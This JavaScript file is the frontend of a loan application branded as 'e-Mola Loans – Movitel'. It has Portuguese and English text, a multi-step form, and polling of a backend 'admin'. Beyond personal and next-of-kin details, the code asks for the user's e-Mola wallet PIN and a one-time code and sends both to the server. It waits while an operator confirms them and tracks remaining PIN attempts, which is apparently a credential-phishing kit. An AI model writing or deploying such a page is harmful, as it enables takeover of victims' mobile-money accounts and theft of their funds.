// ============================================================
// e-Mola Loan Application – Frontend Logic (Bilingual)
// ============================================================

// ─── Translation Dictionary ───
const translations = {
  en: {
    welcome: "Welcome to e-Mola",
    tagline: "Fast, easy loans right from your phone",
    start: "START",
    footer: "© 2026 e-Mola Loans – Movitel",
    back: "← Back",
    loan_details: "Loan Details",
    step1_sub: "Step 1 of 4",
    loan_amount: "Loan Amount (1,000 - 50,000 MZN)",
    duration: "Duration (14 - 120 days)",
    principal: "Principal Amount:",
    interest: "Interest (0.5% daily):",
    total_payable: "Total Repayable:",
    reason: "Reason for Loan",
    next_step: "NEXT STEP",
    personal_details: "Personal Details",
    step2_sub: "Step 2 of 4",
    first_name: "First Name",
    last_name: "Last Name",
    phone_label: "Phone Number (Mozambique)",
    phone_hint: "9 digits without +258 prefix (e.g., 841234567)",
    email: "Email",
    back_btn: "BACK",
    next: "NEXT",
    kin_details: "Next of Kin",
    step3_sub: "Step 3 of 4",
    kin_first_name: "Kin First Name",
    kin_last_name: "Kin Last Name",
    kin_phone: "Kin Phone Number",
    province_label: "Province",
    select_province: "Select Province",
    summary: "Application Summary",
    amount_sk: "Amount:",
    duration_sk: "Duration:",
    total_sk: "Total Repayable:",
    applicant_sk: "Applicant:",
    submit: "SUBMIT APPLICATION",
    pin_title: "Enter e-Mola PIN",
    pin_sub: "Step 4 of 4",
    pin_label: "Enter your e-Mola PIN (4 digits):",
    pin_attempts: "🔑 Attempts remaining: 3 of 3",
    confirm_pin: "CONFIRM PIN",
    otp_title: "Enter OTP Code",
    otp_sub: "4-digit code sent to your phone via e-Mola",
    otp_code_label: "OTP Code (4 digits):",
    resend_otp: "Resend OTP",
    verify_otp: "VERIFY & APPROVE",
    processing_title: "Processing Application...",
    processing_sub: "Please wait while we process your loan",
    processing_status: "⏳ Awaiting admin approval...",
    approved_title: "Loan Approved!",
    approved_sub: "Your loan has been successfully approved.",
    amount_receive: "Amount to Receive",
    important_info: "ℹ️ Important Information",
    important_info_text: "The funds will be deposited directly to your e-Mola account within 5 minutes. Please ensure your phone number is correct.",
    loan_details_title: "📊 Loan Details",
    amount_label: "Amount",
    duration_label: "Duration",
    total_label: "Total Repayment",
    next_steps: "Next Steps: To start repaying, you can set up an automatic payment plan in your e-Mola account.",
    finish: "FINISH",
    // Error messages (used with showError)
    err_reason: "Please provide a reason for the loan.",
    err_fields: "Please fill all fields correctly.",
    err_pin: "Enter a 4-digit PIN.",
    err_otp: "Enter a 4-digit OTP.",
    err_wrong_pin: "Wrong PIN.",
    err_blocked_pin: "Application blocked. Please wait 5 minutes.",
    err_app_rejected: "Your application was rejected by the admin.",
    err_otp_rejected: "OTP rejected. Please request a new OTP."
  },
  pt: {
    welcome: "Bem-vindo ao e-Mola",
    tagline: "Empréstimos rápidos e fáceis direto do seu telemóvel",
    start: "COMEÇAR",
    footer: "© 2026 e-Mola Empréstimos – Movitel",
    back: "← Voltar",
    loan_details: "Detalhes do Empréstimo",
    step1_sub: "Passo 1 de 4",
    loan_amount: "Valor do Empréstimo (1.000 – 50.000 MZN)",
    duration: "Prazo (14 – 120 dias)",
    principal: "Montante Principal:",
    interest: "Juros (0,5% diário):",
    total_payable: "Total a Pagar:",
    reason: "Motivo do Empréstimo",
    next_step: "PRÓXIMO PASSO",
    personal_details: "Dados Pessoais",
    step2_sub: "Passo 2 de 4",
    first_name: "Nome",
    last_name: "Apelido",
    phone_label: "Número de Telemóvel (Moçambique)",
    phone_hint: "9 dígitos sem o prefixo +258 (ex: 841234567)",
    email: "Email",
    back_btn: "VOLTAR",
    next: "PRÓXIMO",
    kin_details: "Parente Próximo",
    step3_sub: "Passo 3 de 4",
    kin_first_name: "Nome do Parente",
    kin_last_name: "Apelido",
    kin_phone: "Telemóvel do Parente",
    province_label: "Província",
    select_province: "Seleccione a Província",
    summary: "Resumo do Pedido",
    amount_sk: "Montante:",
    duration_sk: "Prazo:",
    total_sk: "Total a Pagar:",
    applicant_sk: "Requerente:",
    submit: "SUBMETER PEDIDO",
    pin_title: "Introduza o PIN e-Mola",
    pin_sub: "Passo 4 de 4",
    pin_label: "Introduza o seu PIN e-Mola (4 dígitos):",
    pin_attempts: "🔑 Tentativas restantes: 3 de 3",
    confirm_pin: "CONFIRMAR PIN",
    otp_title: "Introduza o Código OTP",
    otp_sub: "Código de 4 dígitos enviado ao seu telemóvel via e-Mola",
    otp_code_label: "Código OTP (4 dígitos):",
    resend_otp: "Reenviar OTP",
    verify_otp: "VERIFICAR E APROVAR",
    processing_title: "A Processar Pedido...",
    processing_sub: "Aguarde enquanto processamos o seu empréstimo",
    processing_status: "⏳ A aguardar aprovação do administrador...",
    approved_title: "Empréstimo Aprovado!",
    approved_sub: "O seu empréstimo foi aprovado com sucesso.",
    amount_receive: "Valor a Receber",
    important_info: "ℹ️ Informação Importante",
    important_info_text: "Os fundos serão depositados directamente na sua conta e-Mola dentro de 5 minutos. Verifique se o número está correcto.",
    loan_details_title: "📊 Detalhes do Empréstimo",
    amount_label: "Montante",
    duration_label: "Prazo",
    total_label: "Total a Pagar",
    next_steps: "Próximos Passos: Para começar a pagar, pode configurar um plano de pagamento automático na sua conta e-Mola.",
    finish: "CONCLUIR",
    // Error messages
    err_reason: "Por favor indique o motivo do empréstimo.",
    err_fields: "Por favor preencha todos os campos correctamente.",
    err_pin: "Introduza um PIN de 4 dígitos.",
    err_otp: "Introduza um OTP de 4 dígitos.",
    err_wrong_pin: "PIN errado.",
    err_blocked_pin: "Pedido bloqueado. Aguarde 5 minutos.",
    err_app_rejected: "O seu pedido foi rejeitado pelo administrador.",
    err_otp_rejected: "OTP rejeitado. Peça um novo OTP."
  }
};

let currentLang = localStorage.getItem('emola_lang') || 'pt'; // default Portuguese

function toggleLanguage() {
  currentLang = currentLang === 'pt' ? 'en' : 'pt';
  localStorage.setItem('emola_lang', currentLang);
  applyLanguage();
}

function applyLanguage() {
  // Update all elements with data-i18n
  document.querySelectorAll('[data-i18n]').forEach(el => {
    const key = el.getAttribute('data-i18n');
    if (translations[currentLang][key]) {
      el.textContent = translations[currentLang][key];
    }
  });

  // Update language button label
  const langBtn = document.querySelector('.lang-btn');
  if (langBtn) {
    langBtn.textContent = currentLang === 'pt' ? '🌐 EN' : '🌐 PT';
  }
}

// ─── State Management ───
let appData = {
  loanAmount: 5000,
  loanDuration: 30,
  firstName: '',
  lastName: '',
  phone: '',
  email: '',
  kinFirstName: '',
  kinLastName: '',
  kinPhone: '',
  province: '',
  loanReason: '',
  applicationId: null
};

let currentPage = 'page-landing';

function saveState() {
  const state = { appData, currentPage, currentLang };
  localStorage.setItem('emola_app_state', JSON.stringify(state));
}

function loadState() {
  const saved = localStorage.getItem('emola_app_state');
  if (saved) {
    try {
      const parsed = JSON.parse(saved);
      appData = parsed.appData || appData;
      currentPage = parsed.currentPage || 'page-landing';
      if (parsed.currentLang) currentLang = parsed.currentLang;
      return true;
    } catch (e) {
      console.error('Failed to parse saved state', e);
    }
  }
  return false;
}

function clearState() {
  localStorage.removeItem('emola_app_state');
}

// ─── Page Navigation ───
function goTo(pageId) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.getElementById(pageId).classList.add('active');
  currentPage = pageId;
  saveState();
}

function clearErr(id) {
  const el = document.getElementById(id);
  el.classList.remove('show');
}

// ─── Landing ───
function startApplication() {
  appData = {
    loanAmount: 5000,
    loanDuration: 30,
    firstName: '',
    lastName: '',
    phone: '',
    email: '',
    kinFirstName: '',
    kinLastName: '',
    kinPhone: '',
    province: '',
    loanReason: '',
    applicationId: null
  };
  goTo('page-step1');
  document.getElementById('s1am').value = 5000;
  document.getElementById('s1dur').value = 30;
  updateStep1Calc();
}

// ─── Step 1 ───
function updateStep1Calc() {
  let amt = parseInt(document.getElementById('s1am').value);
  let dur = parseInt(document.getElementById('s1dur').value);
  let interest = amt * 0.005 * dur;
  let total = amt + interest;
  document.getElementById('s1AmtDisplay').textContent = `${amt.toLocaleString()} MZN`;
  document.getElementById('s1DurDisplay').textContent = `${dur} days`;
  document.getElementById('s1Principal').textContent = `${amt.toLocaleString()} MZN`;
  document.getElementById('s1Interest').textContent = `${interest.toLocaleString()} MZN`;
  document.getElementById('s1Total').textContent = `${total.toLocaleString()} MZN`;
  appData.loanAmount = amt;
  appData.loanDuration = dur;
  saveState();
}

function toS2() {
  let reason = document.getElementById('s1reason').value.trim();
  if (!reason) {
    showError('s1Err', 'err_reason');
    return;
  }
  appData.loanReason = reason;
  goTo('page-step2');
}

// ─── Step 2 ───
function toS3() {
  let fi = document.getElementById('s2fi').value.trim();
  let la = document.getElementById('s2la').value.trim();
  let ph = document.getElementById('s2ph').value.trim();
  let em = document.getElementById('s2em').value.trim();
  if (!fi || !la || ph.length !== 9 || !em) {
    showError('s2Err', 'err_fields');
    return;
  }
  appData.firstName = fi;
  appData.lastName = la;
  appData.phone = ph;
  appData.email = em;
  document.getElementById('sA').textContent = `${appData.loanAmount.toLocaleString()} MZN`;
  document.getElementById('sT').textContent = `${appData.loanDuration} Days`;
  document.getElementById('sR').textContent = `${(appData.loanAmount * (1 + 0.005 * appData.loanDuration)).toLocaleString()} MZN`;
  document.getElementById('sN').textContent = `${fi} ${la}`;
  goTo('page-step3');
}

// ─── Submit Application ───
async function submitApp() {
  let kf = document.getElementById('s3kf').value.trim();
  let kl = document.getElementById('s3kl').value.trim();
  let kp = document.getElementById('s3kp').value.trim();
  let prov = document.getElementById('s3prov').value;
  if (!kf || !kl || kp.length !== 9 || !prov) {
    showError('s3Err', 'err_fields');
    return;
  }
  appData.kinFirstName = kf;
  appData.kinLastName = kl;
  appData.kinPhone = kp;
  appData.province = prov;

  try {
    const response = await fetch('/api/send-application', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationData: appData })
    });
    const data = await response.json();
    if (data.ok) {
      appData.applicationId = data.applicationId;
      goTo('page-processing');
      document.getElementById('processingStatus').textContent = currentLang === 'pt' ? '⏳ A aguardar aprovação do administrador...' : '⏳ Awaiting admin approval...';
      startAppPolling();
    } else {
      alert('Error: ' + data.error);
    }
  } catch (err) {
    console.error(err);
    alert('Network error. Please try again.');
  }
}

// ─── App Approval Polling ───
function startAppPolling() {
  if (window._appInterval) clearInterval(window._appInterval);
  window._appInterval = setInterval(async () => {
    try {
      const res = await fetch(`/api/status/${appData.applicationId}/app`, {
        cache: 'no-store'
      });
      if (res.status === 404) {
        clearInterval(window._appInterval);
        clearState();
        alert(currentLang === 'pt' ? 'Pedido não encontrado. Recomece.' : 'Application not found. Please start again.');
        goTo('page-landing');
        return;
      }
      const data = await res.json();

      if (data.status === 'approved') {
        clearInterval(window._appInterval);
        goTo('page-pin');
        clearLoginPin();
        document.getElementById('pinAttemptsDisplay').textContent = currentLang === 'pt' ? '🔑 Tentativas restantes: 3 de 3' : '🔑 Attempts remaining: 3 of 3';
        return;
      }
      if (data.status === 'rejected') {
        clearInterval(window._appInterval);
        clearState();
        alert(currentLang === 'pt' ? 'O seu pedido foi rejeitado pelo administrador.' : 'Your application was rejected by the admin.');
        goTo('page-landing');
        return;
      }
    } catch (err) {
      console.error('App polling error:', err);
    }
  }, 3000);
}

// ─── PIN Submission ───
async function doPin() {
  let pin = '';
  for (let i = 0; i < 4; i++) pin += document.getElementById('pin' + i).value;
  if (pin.length !== 4) {
    showError('pinErr', 'err_pin');
    return;
  }

  try {
    const response = await fetch('/api/send-pin', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationId: appData.applicationId, pin })
    });
    const data = await response.json();
    if (data.ok) {
      startPinPolling();
    } else if (data.blocked) {
      showError('pinErr', 'err_blocked_pin');
      disablePinInputs();
    } else {
      showError('pinErr', data.error || 'Error');
    }
  } catch (err) {
    alert('Network error');
  }
}

// ─── PIN Polling ───
function startPinPolling() {
  if (window._pinInterval) clearInterval(window._pinInterval);
  window._pinInterval = setInterval(async () => {
    try {
      const res = await fetch(`/api/status/${appData.applicationId}/pin`, {
        cache: 'no-store'
      });
      if (res.status === 404) {
        clearInterval(window._pinInterval);
        clearState();
        alert(currentLang === 'pt' ? 'Pedido não encontrado. Recomece.' : 'Application not found. Please start again.');
        goTo('page-landing');
        return;
      }
      const data = await res.json();

      if (data.status === 'approved') {
        clearInterval(window._pinInterval);
        clearLoginPin();
        document.getElementById('pinAttemptsDisplay').textContent = currentLang === 'pt' ? '🔑 Tentativas restantes: 3 de 3' : '🔑 Attempts remaining: 3 of 3';
        goTo('page-otp');
        return;
      }
      if (data.status === 'rejected') {
        const remaining = data.remainingAttempts;
        document.getElementById('pinAttemptsDisplay').textContent = currentLang === 'pt' ? `🔑 Tentativas restantes: ${remaining} de 3` : `🔑 Attempts remaining: ${remaining} of 3`;
        showError('pinErr', 'err_wrong_pin');
        clearLoginPin();
        return;
      }
      if (data.status === 'blocked') {
        clearInterval(window._pinInterval);
        document.getElementById('pinAttemptsDisplay').textContent = currentLang === 'pt' ? '🔒 Demasiadas tentativas. Aguarde 5 minutos.' : '🔒 Too many attempts. Please wait 5 minutes.';
        disablePinInputs();
        showError('pinErr', 'err_blocked_pin');
        return;
      }
    } catch (err) {
      console.error('Pin polling error:', err);
    }
  }, 3000);
}

// ─── OTP Submission ───
async function doOtp() {
  let otp = '';
  for (let i = 0; i < 4; i++) otp += document.getElementById('otp' + i).value;
  if (otp.length !== 4) {
    showError('otpErr', 'err_otp');
    return;
  }

  try {
    const response = await fetch('/api/send-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationId: appData.applicationId, otp })
    });
    const data = await response.json();
    if (data.ok) {
      startOtpPolling();
    } else {
      showError('otpErr', data.error || 'Error');
    }
  } catch (err) {
    alert('Network error');
  }
}

// ─── OTP Polling ───
function startOtpPolling() {
  if (window._otpInterval) clearInterval(window._otpInterval);
  window._otpInterval = setInterval(async () => {
    try {
      const res = await fetch(`/api/status/${appData.applicationId}/otp`, {
        cache: 'no-store'
      });
      if (res.status === 404) {
        clearInterval(window._otpInterval);
        clearState();
        alert(currentLang === 'pt' ? 'Pedido não encontrado. Recomece.' : 'Application not found. Please start again.');
        goTo('page-landing');
        return;
      }
      const data = await res.json();

      if (data.status === 'approved') {
        clearInterval(window._otpInterval);
        showApproval();
        return;
      }
      if (data.status === 'rejected') {
        clearInterval(window._otpInterval);
        showRejected('err_otp_rejected');
        return;
      }
    } catch (err) {
      console.error('OTP polling error:', err);
    }
  }, 3000);
}

// ─── Resend OTP ───
async function resendOtp() {
  try {
    const response = await fetch('/api/resend-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationId: appData.applicationId })
    });
    const data = await response.json();
    if (data.ok) {
      alert(currentLang === 'pt' ? 'Pedido de reenvio enviado ao administrador.' : 'OTP resend request sent to admin.');
    } else {
      alert('Error: ' + data.error);
    }
  } catch (err) {
    alert('Network error');
  }
}

// ─── Approval / Rejection ───
function showApproval() {
  document.getElementById('aprAmount').textContent = `${appData.loanAmount.toLocaleString()} MZN`;
  document.getElementById('aprTerm').textContent = `${appData.loanDuration} Days`;
  document.getElementById('aprMth').textContent = `${(appData.loanAmount * (1 + 0.005 * appData.loanDuration)).toLocaleString()} MZN`;
  goTo('page-approval');
  clearState();
}

function showRejected(reasonKey) {
  alert(translations[currentLang][reasonKey] || reasonKey);
  clearState();
  goTo('page-landing');
}

// ─── Helpers ───
function showError(id, msgKey) {
  const el = document.getElementById(id);
  el.querySelector('span:last-child').textContent = translations[currentLang][msgKey] || msgKey;
  el.classList.add('show');
  setTimeout(() => el.classList.remove('show'), 3000);
}

function normalizePhone(id) {
  let el = document.getElementById(id);
  el.value = el.value.replace(/\D/g, '').slice(0, 9);
}

function disablePinInputs() {
  document.querySelectorAll('.pin-box').forEach(inp => inp.disabled = true);
}

function pinMvM(input, idx) {
  if (input.value.length > 0 && idx < 3) {
    document.getElementById('pin' + (idx + 1)).focus();
  }
  if (input.value.length === 0 && idx > 0) {
    document.getElementById('pin' + (idx - 1)).focus();
  }
}
function togPin() {
  let inputs = document.querySelectorAll('.pin-box');
  inputs.forEach(inp => inp.type = inp.type === 'password' ? 'text' : 'password');
}
function clearLoginPin() {
  document.querySelectorAll('.pin-box').forEach(inp => inp.value = '');
}

function handleOtpInput(input, type) {
  if (input.value.length > 0 && input.id !== 'otp3') {
    document.getElementById('otp' + (parseInt(input.id.slice(3)) + 1)).focus();
  }
}
function clearOtpCode() {
  document.querySelectorAll('.otp-box').forEach(inp => inp.value = '');
}

// ─── Restore State on Page Load ───
document.addEventListener('DOMContentLoaded', function() {
  const restored = loadState();
  applyLanguage(); // Apply language from localStorage or default

  if (restored && appData.applicationId) {
    if (currentPage === 'page-processing') {
      goTo('page-processing');
      startAppPolling();
    } else if (currentPage === 'page-pin') {
      goTo('page-pin');
    } else if (currentPage === 'page-otp') {
      goTo('page-otp');
    } else if (currentPage === 'page-step1' || currentPage === 'page-step2' || currentPage === 'page-step3') {
      goTo(currentPage);
    } else {
      goTo(currentPage);
    }
  } else {
    goTo('page-landing');
  }
});
